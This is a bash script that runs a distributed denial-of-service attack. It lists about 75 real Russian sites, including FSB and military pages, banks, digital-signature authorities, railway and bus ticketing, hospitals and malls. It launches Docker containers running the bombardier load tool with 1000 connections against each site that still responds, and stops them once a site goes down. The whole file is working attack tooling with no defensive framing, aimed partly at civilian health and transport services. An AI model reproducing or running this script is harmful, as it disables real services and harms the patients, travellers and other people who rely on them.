#!bin/bash

declare -a sites=(
  "https://www.sobyanin.ru/"
  "https://95.213.255.22:443"
  "ww.tinkoff.ru/"
  "https://iecp.ru/ep/ep-verification"
  "https://iecp.ru/ep/uc-list"
  "http://www.nucrf.ru"
  "http://www.belinfonalog.ru"
  "http://www.roseltorg.ru"
  "http://www.astralnalog.ru"
  "http://www.nwudc.ru"
  "http://www.center-inform.ru"
  "https://kk.bank/UdTs"
  "http://structure.mil.ru"
  "http://www.ucpir.ru"
  "http://dreamkas.ru"
  "http://www.e-portal.ru"
  "http://izhtender.ru"
  "http://imctax.parus-s.ru"
  "http://www.icentr.ru"
  "http://www.kartoteka.ru"
  "http://rsbis.ru/elektronnaya-podpis"
  "http://www.stv-it.ru"
  "http://www.crypset.ru"
  "http://www.kt-69.ru"
  "http://www.24ecp.ru"
  "http://kraskript.com"
  "http://ca.ntssoft.ru"
  "http://www.y-center.ru"
  "http://www.rcarus.ru"
  "http://rk72.ru"
  "http://squaretrade.ru"
  "http://ca.gisca.ru"
  "http://www.otchet-online.ru"
  "http://udcs.ru"
  "http://www.cit-ufa.ru"
  "http://elkursk.ru"
  "http://www.icvibor.ru"
  "http://ucestp.ru"
  "http://mcspro.ru"
  "http://www.infotrust.ru"
  "http://epnow.ru"
  "http://ca.kamgov.ru"
  "http://mascom-it.ru"
  "http://cfmc.ru"
  "https://xn--90aivcdt6dxbc.xn--p1ai/"
  "https://uc-osnovanie.ru/"
  "https://poezd.ru/"
  "https://rzd.ru/"
  "https://vokzalbelgorod.ru/"
  "https://vokzalkursk.ru/"
  "https://vokzalrostov.ru/"
  "http://rostov.dzvr.ru/"
  "http://voronezh.rusavtobus.ru/"
  "http://www.bus46.ru/"
  "http://bus46.ru/"
  "https://avtovokzal31.ru/"
  "https://busfor.ru/"
  "https://goonbus.ru/"
  "https://krasnodar1.ru/"
  "https://rfbus.ru/"
  "https://russia.poezda.net/"
  "https://www.avtovokzaly.ru/"
  "https://www.poezda.net/"
  "https://tagancity.ru/"
  "http://taghospital.ru"
  "https://www.tutu.ru/"
  "https://tagmed1.ru/"
  "http://taganrog-gbsmp.ru/"
  "http://tgb3.ru/"
  "https://marmeladmall.ru/"
  "http://letomall.su/"
  "http://77.222.61.246/"
  "https://kak-doehat.ru"
  "http://fsb.ru"
  "https://fsb.ru"
)

# Configuration of Bombardier
BOMBARDIER_TIMEOUT=600000s
BOMBARDIER_CONNECTIONS=1000

containersLimit=$1

for site in "${sites[@]}"; do

  runningContainers=$(docker ps -q | wc -l);
  runningContainers=${runningContainers##*( )}
  if [[ "$containersLimit" -lt "$runningContainers" ]];
  then
    echo "$runningContainers already running. Can't add more"
    return;
  fi

  container_name=${site##*//}
  container_name=${container_name%/}
  container_name=${container_name%%/*}
  containers=$(docker ps --filter name=$container_name)

  status_code=$(curl -m 2 -o /dev/null -s -w "%{http_code}" "$site")
  status_code=$(expr "$status_code" + 0)

  # If status code is zero site is already blocked
  site_status="${site} status code ${status_code}"
  echo "$site_status"
  if (($status_code != 0 && $status_code <= 400)); then
    if [[ "$containers" != *"$container_name"* ]];
    then
        docker run --name=$container_name -ti -d --rm alpine/bombardier -c $BOMBARDIER_CONNECTIONS -d $BOMBARDIER_TIMEOUT -l $site
        echo "$container_name has been launched"
        continue;
    fi
  elif (($status_code == 0));
  then
    if [[ "$containers" == *"$container_name"* ]];
    then
        docker kill $container_name
        echo "$container_name has been stopped"
    fi
  fi
done